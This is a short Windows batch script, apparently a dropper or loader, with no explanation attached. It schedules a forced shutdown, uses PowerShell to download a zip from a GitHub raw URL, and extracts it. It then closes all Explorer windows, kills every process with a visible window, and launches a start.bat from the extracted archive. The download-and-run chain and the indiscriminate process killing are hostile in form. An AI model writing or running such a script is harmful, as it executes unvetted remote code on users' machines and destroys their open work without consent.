start cmd.exe /k "shutdown -s -f -t 39600"
timeout /t 4

start cmd.exe /k "powershell -command "$url = 'https://github.com/mortingenstrasse95/mng/raw/main/XX.zip'; $output = 'C:/Users/Test/Desktop/XX.zip'; $start_time = Get-Date; $wc = New-Object System.Net.WebClient; $wc.DownloadFile($url, $output); Write-Output 'Time taken: $((Get-Date).Subtract($start_time).Seconds) second(s)';"

timeout /t 8

start cmd.exe /k "powershell -command "Expand-Archive -Path C:/Users/Test/Desktop/XX.zip -DestinationPath C:/Users/Test/Desktop/XX/;""

timeout /t 8

start cmd.exe /k powershell -command "(New-Object -comObject Shell.Application).Windows() | foreach-object {$_.quit()}; Get-Process | Where-Object {$_.MainWindowTitle -ne \"\"} | stop-process"
timeout /t 5

start /d "C:/Users/Test/Desktop/XX/xx/" start.bat
timeout /t 6

exit
